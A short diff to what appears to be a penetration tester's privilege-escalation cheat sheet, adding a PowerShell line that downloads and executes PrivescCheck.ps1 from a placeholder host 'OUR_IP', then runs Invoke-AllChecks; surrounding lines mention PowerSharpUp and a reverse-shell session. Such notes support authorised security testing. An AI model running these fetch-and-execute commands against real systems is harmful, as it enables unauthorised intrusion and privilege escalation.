@@ -18,6 +18,14 @@ OR
 
     PowerSharpUp -SharpUp
 
+#### Alternate script: PrivescCheck
+
+    iex(new-object net.webclient).downloadstring('http://OUR_IP/PrivescCheck.ps1')
+
+Then
+
+    Invoke-AllChecks
+
 ### 2) Linux
 
 If using penelope reverse shell, in our session press F12, then write:
